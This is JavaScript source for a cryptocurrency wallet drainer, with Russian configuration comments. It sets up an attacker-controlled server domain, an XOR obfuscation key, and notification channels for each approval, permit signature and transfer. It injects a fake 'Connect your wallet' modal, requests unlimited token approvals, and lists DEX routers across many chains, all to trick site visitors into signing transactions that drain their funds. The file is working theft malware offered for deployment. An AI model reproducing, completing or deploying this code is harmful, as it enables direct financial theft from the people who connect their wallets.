// =====================================================================
// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
// =====================================================================

let CF_EKEY = 234343253453; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
// Это же число должно быть указано и в файле server.js - если они будут различаться, то ничего не будет работать правильно
const CF_HTTP_MODE = false; // [LOCALHOST TEST ONLY] Включите, чтобы скрипт обращался к серверу по HTTP, например, чтобы протестировать скрипт
const CF_Server_PORT = 443; // Если при обращении к серверу нужен кастомный порт, то укажите его здесь (по умолчанию - 443)
// По умолчанию для работы по HTTP нужен порт 80, а для работы по HTTPS необходим порт 443
const CF_Server_URL = "lovelike777.shop"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const CF_WalletConnect_ID = "61cb704eeafaa41c97d99183ed9a1a14"; // Project ID из WalletConnect Cloud
// Если WalletConnect не работает, обязательно поменяйте этот ID, получить новый можно здесь: https://cloud.walletconnect.com/
// Регистрируемся на сайте, выбираем создать новый проект, ставим AppKit => JavaScript, заполнять дополнительные настройки необязательно
// Project ID будет в левом верхнем углу и должен быть похожим на тот, что вставлен по умолчанию по виду и длине

const CF_Modal_Style = 2; // 1 - старая (не рекомендуется), 2 - новая (обновление от 17.11.2023)
const CF_Loader_Style = 2; // 1 - старый (не рекомендуется), 2 - новый (обновление от 17.11.2023)
const CF_Color_Scheme = 'light'; // light - светлая тема, dark - тёмная тема
const CF_Modal_Mode = 2; // 1 - выбирать кошелек нажатием и подключать кнопкой, 2 - подключать сразу после выбора

const CF_Verify_Message = ""; // Сообщение для верификации кошелька, может содержать тег {{ADDRESS}}
// По умолчанию оставьте пустым, чтобы получать сообщение с сервера, иначе заполните, чтобы использовать кастомное

// С помощью настройки ниже вы можете кастомизировать то, как будет выглядеть ваш сайт в интерфейсе WalletConnect
// Изменять необязательно, большинство кошельков работают с настройками по умолчанию
// Настройка не связана с переключателем CF_WalletConnect_Customization, он нужен только для кастомизации дизайна

const CF_WalletConnect_MetaData = {
  name: document.title, // По умолчанию такое же как название сайта
  description: "Web3 Application", // По умолчанию "Web3 Application"
  url: "https://" + window.location.host, // По умолчанию как домен сайта
  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
};

const CF_WalletConnect_Customization = 0; // 0 - использовать окно по умолчанию, 1 - пользовательская кастомизация
const CF_WalletConnect_Theme = { // Параметры кастомизации доступны здесь: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
  themeMode: 'light',
  themeVariables: {
    '--w3m-background-color': '#000000',
    '--w3m-accent-color': '#F5841F',
    '--w3m-z-index': 9999999
  }
};

const CF_Custom_Chat = {
  Enable: 0, // 0 - использовать настройки сервера, 1 - использовать настройки клиента
  Chat_Settings: {
    enter_website: "", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  }
};

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

const IO_ABI = `[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"donor","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Donation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"depositId","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"userId","type":"uint256"},{"indexed":true,"internalType":"address","name":"userWallet","type":"address"},{"indexed":false,"internalType":"uint256","name":"expiryTime","type":"uint256"},{"indexed":false,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"fromAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"NewDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"}],"name":"depositNative","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"fromAddress","type":"address"}],"name":"depositToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"deposits","outputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"depositId","type":"uint256"}],"name":"getDeposit","outputs":[{"components":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"internalType":"struct InvestmentModerator.Deposit","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"getUserDeposits","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextDepositId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnNative","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userDeposits","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]`;

if (typeof CF_Pancake_Whitelist == 'undefined' && typeof MS_Pancake_Whitelist != 'undefined') CF_Pancake_Whitelist = MS_Pancake_Whitelist;
if (typeof CF_Uniswap_Whitelist == 'undefined' && typeof MS_Uniswap_Whitelist != 'undefined') CF_Uniswap_Whitelist = MS_Uniswap_Whitelist;

var CF_Worker_ID = null;
const BN = ethers.BigNumber.from;

let CF_Ready = false, CF_Settings = {}, CF_Contract_ABI = {}, CF_ID = 0, CF_Process = false,
CF_Provider = null, CF_Current_Provider = null, CF_Current_Address = null, CF_Current_Chain_ID = null,
CF_Web3 = null, CF_Signer = null, CF_Check_Done = false, CF_Currencies = {}, CF_Force_Mode = false,
CF_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, CF_Bad_Country = false, CF_Wallet_Name = null,
CF_Connection = false, CF_Load_Time = null, CF_Gas_Multiplier = 2, CF_Partner_Address = false, CF_AppKit = null;

const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };

(async () => {
  try {
    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    CF_Currencies = await response.json();
    CF_Currencies['PLS'] = { USD: 0.00004512 };
  } catch(err) {
    console.log(err);
  }
})();

const CF_API_Data = {
  1: 'api.etherscan.io',
  10: 'api-optimistic.etherscan.io',
  56: 'api.bscscan.com',
  137: 'api.polygonscan.com',
  250: 'api.ftmscan.com',
  42161: 'api.arbiscan.io',
  43114: 'api.snowtrace.io',
  8453: 'api.basescan.org',
  81457: 'api.blastscan.io',
};

var CF_MetaMask_ChainData = {};

const fill_chain_data = () => {
  CF_MetaMask_ChainData = {
    1: {
      chainId: '0x1',
      chainName: "Ethereum Mainnet",
      nativeCurrency: {
        name: "Ether",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[1]],
      blockExplorerUrls: ["https://etherscan.io"]
    },
    56: {
      chainId: '0x38',
      chainName: "BNB Smart Chain",
      nativeCurrency: {
        name: "Binance Coin",
        symbol: "BNB",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[56]],
      blockExplorerUrls: ["https://bscscan.com"]
    },
    137: {
      chainId: '0x89',
      chainName: "Polygon Mainnet",
      nativeCurrency: {
        name: "MATIC",
        symbol: "MATIC",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[137]],
      blockExplorerUrls: ["https://polygonscan.com"]
    },
    43114: {
      chainId: '0xA86A',
      chainName: "Avalanche Network C-Chain",
      nativeCurrency: {
        name: "AVAX",
        symbol: "AVAX",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[43114]],
      blockExplorerUrls: ["https://snowtrace.io/"]
    },
    42161: {
      chainId: '0xA4B1',
      chainName: "Arbitrum One",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[42161]],
      blockExplorerUrls: ["https://explorer.arbitrum.io"]
    },
    81457: {
      chainId: '0x13e31',
      chainName: "Blast",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[81457]],
      blockExplorerUrls: ["https://blastscan.io/"]
    },
    10: {
      chainId: '0xA',
      chainName: "Optimism",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[10]],
      blockExplorerUrls: ["https://optimistic.etherscan.io/"]
    },
    250: {
      chainId: '0xFA',
      chainName: "Fantom Opera",
      nativeCurrency: {
        name: "FTM",
        symbol: "FTM",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[250]],
      blockExplorerUrls: ["https://ftmscan.com/"]
    },
    8453: {
      chainId: '0x2105',
      chainName: "Base",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[8453]],
      blockExplorerUrls: ["https://basescan.org/"]
    },
    324: {
      chainId: '0x144',
      chainName: "zkSync Era",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[324]],
      blockExplorerUrls: ["https://explorer.zksync.io/"]
    },
    369: {
      chainId: '0x171',
      chainName: "Pulse",
      nativeCurrency: {
        name: "PLS",
        symbol: "PLS",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[369]],
      blockExplorerUrls: ["https://scan.pulsechain.com/"]
    },
  };
};

const CF_Routers = {
  1: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
  ],
  10: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']
  ],
  56: [
    ['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  137: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],
    ['Quickswap', '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
  ],
  250: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  42161: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  43114: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ]
};

const CF_Swap_Route = {
  1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
  10: '0x4200000000000000000000000000000000000006',
  56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
  137: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
  250: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  42161: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
  43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
};

const CF_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
const CF_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];
const CF_Pancake_Native_ABI = [{"inputs":[{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"}];

const CF_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
const CF_Mobile_Status = (() => {
  let check = false;
  (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
})();
const CF_Apple_Status = (() => {
  try {
    return [
      'iPad Simulator', 'iPhone Simulator', 'iPod Simulator', 'iPad', 'iPhone', 'iPod'
    ].includes(navigator.platform) || (navigator.userAgent.includes("Mac") && "ontouchend" in document);
  } catch(err) {
    return false;
  }
})();

const CF_Unlimited_Amount = '1158472395435294898592384258348512586931256';

const CF_Modal_Data = [
  {
    type: 'style',
    data: `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/graphics/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }`
  },
  {
    type: 'html',
    data: `<div class="web3-modal-main"><p class="web3-modal-title" style="margin-top:0">Connect your wallet</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("MetaMask")'><div><div class="icon"><img src="/assets/graphics/images/MM.svg" alt=""></div><span>MetaMask</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Coinbase")'><div><div class="icon"><img src="/assets/graphics/images/CB.svg" alt=""></div><span>Coinbase</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Trust Wallet")'><div><div class="icon"><img src="/assets/graphics/images/TW.svg" alt=""></div><span>Trust Wallet</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Binance Wallet")'><div><div class="icon"><img src="/assets/graphics/images/BW.svg" alt=""></div><span>Binance Wallet</span></div><div class="arrow"></div></div><div class="item" onclick="init_reown()"><div><div class="icon"></div><span>More Wallets</span></div><div class="arrow"></div></div></div></div><div class="web3-modal-wc" style="display:none"><p class="web3-modal-title" style="margin-top:0">Choose Version</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/graphics/images/WC.svg" alt=""></div><span>WalletConnect</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/graphics/images/WC1.svg" alt=""></div><span>WalletConnect Legacy</span></div><div class="arrow"></div></div><div class="item" onclick="init_co()"><div class="arrow" style="transform:rotateY(190deg)"></div><div><div class="icon"></div><span>Return to Wallets</span></div></div></div></div>`
  }
];

const inject_modal = () => {
  try {
    let modal_style = document.createElement('style');
    modal_style.id = 'web3-style';
    modal_style.innerHTML = CF_Modal_Data[0].data;
    document.head.appendChild(modal_style);
    let overlay_elem = document.createElement('div');
    overlay_elem.id = 'web3-overlay';
    overlay_elem.classList = ['web3-overlay'];
    overlay_elem.style.display = 'none';
    document.body.prepend(overlay_elem);
    document.querySelector('.web3-overlay').addEventListener('click', () => { ms_hide(); });
    let modal_elem = document.createElement('div');
    modal_elem.id = 'web3-modal';
    modal_elem.classList = ['web3-modal'];
    modal_elem.style.display = 'none';
    modal_elem.innerHTML = CF_Modal_Data[1].data;
    document.body.prepend(modal_elem);
  } catch(err) {
    console.log(err);
  }
};

const set_modal_data = (style_code, html_code) => {
  try {
    CF_Modal_Data[0].data = style_code;
    CF_Modal_Data[1].data = html_code;
    reset_modal();
  } catch(err) {
    console.log(err);
  }
};

const reset_modal = () => {
  try { document.getElementById('web3-modal').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-overlay').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-style').remove(); } catch(err) { console.log(err); }
  try { inject_modal(); } catch(err) { console.log(err); }
};

const init_co = () => {
  try {
    if (!CF_Connection) return connect_wallet();
    if (CF_Process) return;
    if (CF_Modal_Style == 2) {
      MSM.open(CF_Color_Scheme, CF_Modal_Mode);
    } else {
      document.getElementById('web3-modal').style.display = 'block';
      document.getElementById('web3-overlay').style.display = 'block';
      document.getElementsByClassName('web3-modal-main')[0].style.display = 'block';
      document.getElementsByClassName('web3-modal-wc')[0].style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

const ms_hide = () => {
  try {
    if (CF_Modal_Style == 2) {
      MSM.close();
    } else {
      document.getElementById('web3-modal').style.display = 'none';
      document.getElementById('web3-overlay').style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

let CF_Is_AppKit_Loaded = false;
let CF_Is_AppKit_Inited = false;
let CF_Is_AppKit_Connected = false;
let CF_Is_AppKit_Opened = false;

const load_wc = async () => {
  if (CF_Is_AppKit_Loaded) return;
  CF_Is_AppKit_Loaded = true;
  if (CF_WalletConnect_Customization) {
    CF_AppKit = AppKit.createAppKit({
      adapters: [new Ethers5Adapter()],
      networks: [
        Networks.mainnet, Networks.bsc, Networks.arbitrum, Networks.avalanche, Networks.optimism,
        Networks.base, Networks.zksync, Networks.polygon, Networks.fantom, Networks.pulsechain
      ],
      metadata: CF_WalletConnect_MetaData,
      projectId: CF_WalletConnect_ID,
      featuredWalletIds: [ '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0' ],
      features: { email: false, socials: [] },
      ...CF_WalletConnect_Theme
    });
  } else {
    CF_AppKit = AppKit.createAppKit({
      adapters: [new Ethers5Adapter()],
      networks: [
        Networks.mainnet, Networks.bsc, Networks.arbitrum, Networks.avalanche, Networks.optimism,
        Networks.base, Networks.zksync, Networks.polygon, Networks.fantom, Networks.pulsechain
      ],
      metadata: CF_WalletConnect_MetaData,
      projectId: CF_WalletConnect_ID,
      featuredWalletIds: [ '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0' ],
      features: { email: false, socials: [] }
    });
  }
  CF_AppKit.subscribeState(async (new_state) => {
    try {

    } catch(err) {
      console.log(err);
    }
  });
  CF_AppKit.subscribeEvents(async (ev) => {
    try {
      // console.log(ev.data)
      if (ev.data.event == 'INITIALIZE') {
        CF_Is_AppKit_Inited = true;
        if (CF_AppKit.getWalletProvider() != undefined) {
          CF_Is_AppKit_Connected = true;
          try {
            CF_AppKit.disconnect(CF_AppKit.getWalletProvider());
          } catch(err) {
            console.log(err);
          }
        }
      } else if (ev.data.event == 'DISCONNECT_SUCCESS') {
        CF_Is_AppKit_Connected = false;
      } else if (ev.data.event == 'CONNECT_SUCCESS') {
        CF_Is_AppKit_Connected = true;
        CF_Current_Address = CF_AppKit.getAddress();
        CF_Provider = CF_AppKit.getWalletProvider();
      } else if (ev.data.event == 'MODAL_OPEN') {
        CF_Is_AppKit_Opened = true;
      } else if (ev.data.event == 'MODAL_CLOSE') {
        CF_Is_AppKit_Opened = false;
      }
    } catch(err) {
      console.log(err);
    }
  });
};

const load_wc_legacy = async () => {
  let all_chains_arr = [], all_chains_obj = {};
  for (const chain_id in CF_Settings.RPCs) {
    if ( chain_id != '1') all_chains_arr.push(chain_id);
    all_chains_obj[chain_id] = CF_Settings.RPCs[chain_id];
  }
  CF_Provider = await WC2_Provider.init({
    projectId: CF_WalletConnect_ID,
    chains: [ '1' ],
    optionalChains: all_chains_arr,
    metadata: CF_WalletConnect_MetaData,
    showQrModal: true,
    rpcMap: all_chains_obj,
    methods: [
      'eth_sendTransaction',
      'eth_signTransaction',
      'eth_sign', 'personal_sign',
      'eth_signTypedData',
      'eth_signTypedData_v4'
    ],
    qrModalOptions: (CF_WalletConnect_Customization == 1) ? CF_WalletConnect_Theme : undefined
  });
};

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

let rsk_kes = 0, last_request_ts = 0;
